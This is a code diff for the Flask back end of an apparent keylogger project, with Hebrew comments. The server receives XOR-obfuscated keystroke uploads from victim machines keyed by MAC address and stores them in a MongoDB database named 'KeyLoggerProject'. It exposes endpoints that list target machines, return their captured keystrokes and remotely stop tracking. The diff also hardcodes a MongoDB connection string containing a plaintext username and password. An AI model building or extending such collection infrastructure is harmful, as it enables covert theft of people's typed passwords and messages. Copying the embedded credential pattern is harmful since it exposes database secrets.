@@ -1,61 +1,74 @@
+from crypt import methods
+
 from flask import Flask,jsonify,request
+from flask_cors import CORS
 from encryptor import Encryptor
 import json
 import os
 import time
 import logging
+from pymongo import MongoClient
 
 class App:
 
     def __init__(self):
-        self.path = "data\\"
-        self.counter = 0
-        self.manager = {}
+        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+        self.client = MongoClient(self.CONNECTION_STRING)
+        self.DB = self.client["KeyLoggerProject"]
+        self.stop_tracking = "success"
 
-    def add_computer(self,computer_name):
-        self.manager[f"computer {self.counter}"] = computer_name
-        self.counter += 1
+
+    def add_computer(self,data):
+        #יצירת קולקשן למחשב הנוכחי
+        collection = self.DB[data["mac_name"]]
+        #הכנסת הנתונים לקולקשן
+        inserted_id = collection.insert_one(data).inserted_id
+        #החזרת הid של הנתונים החדשים
+        return inserted_id
 
     def get_data(self,computer_name):
-        pass
         #בדיקה האם הכניס שם מחשב
+        if not computer_name:
+            return "ERROR: Empty computer"
 
         #בדיקה האם המחשב נמצא במערכת
+        if computer_name not in self.computer_connection:
+            return "ERROR: not found"
 
         #קבלת רשימה של כל הקבצים
+        collection = self.DB[self.computer_connection[computer_name]]
+        data = list(collection.find({},{"_id" : 0}))
+        return data
 
     def get_computer_list(self):
-        computer_list = []
-        for computer in self.manager:
-            computer_list.append(computer)
-        return computer_list
-
+        #קבלת רשימה של כל המחשבים
+        computer_list = self.DB.list_collection_names()
+        #יצירת קישור בין שם מחשב לכתובת שלו
+        self.computer_connection =  {f"computer{i}" : computer_list[i] for i in range(len(computer_list))}
+        #החזרת הרשימה של כל שמות המחשבים
+        return list(self.computer_connection.keys())
 
 class Users:
 
     def __init__(self):
-        self.users = {}
-        # self._load_users()
+        #יצירת חיבור לmongodb
+        #יצירת קולקשן חדש למשתמשים
+        pass
 
-    def verify_user(self,data):
-        if data["username"] in self.users:
-            if data["password"] == self.users[data["users"]]:
-                return True
-        return False
+    def verify_user(self,data:dict):
+        #בדיקה מול המסד נתונים אם קיים המשתמש
+        pass
 
     def check_if_user_exists(self,data):
+        #בדיקה האם שם המשתמש קיים
         pass
 
-    def add_user(self,data):
-        pass
-
-    def _load_users(self):
-        pass
-
-    def save_users(self):
+    def add_user(self,data:dict):
+        #הוספה של מפתח שם משתמש וערך הסיסמא
         pass
 
 app = Flask(__name__)
+CORS(app)
 
 @app.route('/')
 def home():
@@ -64,72 +77,43 @@ def home():
 @app.route("/api/upload",methods=['POST'])
 def upload():
 
+    #קבלת הנתונים שהמחשב שלך
     data = request.get_json()
 
     # ניהול שגיאות
     if error_manager(data):
-        return jsonify({"error": "error", "message": data})
+        return jsonify({"message": data})
 
-    # process = SpecialKeys()
+    #יצירת אוביקט של הצפנה
     decryptor = Encryptor()
 
     #להחזיר את ההצפנה למתונים המקוריים
-    print(data)
     data = decryptor.xor(data)
-    print(data)
 
-    #קבלת הנתונים המתאימים
-    folder_name = data["mac_name"].replace(":","_")
-    new_data = data["data"]
+    #הוספת המחשב לDB
+    manager.add_computer(data)
 
-    #הוספת הכתבות למחלקה
-    manager.add_computer(folder_name)
-
-    #יצירת תיקיה למחשב הנתון
-    folder_path = "data\\" + folder_name
-    open_new_folder(folder_path)
-
-    #יצירת נתיב ליצירת קובץ
-    file_path = folder_path + '\\' + generate_json_file()
-
-    #שליחת הנתונים הרלוונטים לקובץ
-    save_data_in_DB(data,file_path)
-    return jsonify({"message" : "done", "data" : data})
-
+    #החזרת תשובה
+    return jsonify({"message" : manager.stop_tracking})
 
 def error_manager(data:dict) -> bool:
+    #אם לא התקבל ערך
     if not data:
         return True
     return False
-
-
-def open_new_folder(folder_name):
-    if not os.path.exists(folder_name):
-        os.mkdir(folder_name)
-
-def generate_json_file():
-    return "log_" + time.strftime("%Y-%m-%d_%H_%M_%S") + ".json"
-
-def save_data_in_DB(data,file_path):
-    with open(file_path,'w',encoding="utf-8") as file:
-        json.dump(data,file,indent=4,ensure_ascii=False)
-        logging.error(f"file {file_path} is opened")
-
 
 @app.route("/api/get_machine_list",methods=["GET"])
 def get_target_machine_list():
     return jsonify({"message" : manager.get_computer_list()})
 
-@app.route("/get_keystrokes",methods=["GET"])
+@app.route("/api/get_keystrokes",methods=["GET"])
 def get_data_from_DB():
+    #קבלת השם מחשב מהurl
     computer_name = request.args.get("computer")
-
-    manager.get_data(computer_name)
-    #בדיקה האם שלח פרמטר מחשב
-
-    #בדיקה האם קיים כזה מחשב
-
-    #שליחת המידע הרלוונטי
+    #קבלת הנתונים של המחשב מהדאטה בייס
+    data = manager.get_data(computer_name)
+    #החזרת תשובה
+    return jsonify({"data" : data})
 
 
 @app.route("/api/data",methods=['GET'])
@@ -161,6 +145,10 @@ def create_user():
 
     #החזרת תשובה לפרונט
     return  jsonify()
+
+@app.route("/stop_tracking_computer")
+def stop_tracking_computer():
+    manager.stop_tracking = "stop"
 
 
 if __name__ == '__main__':
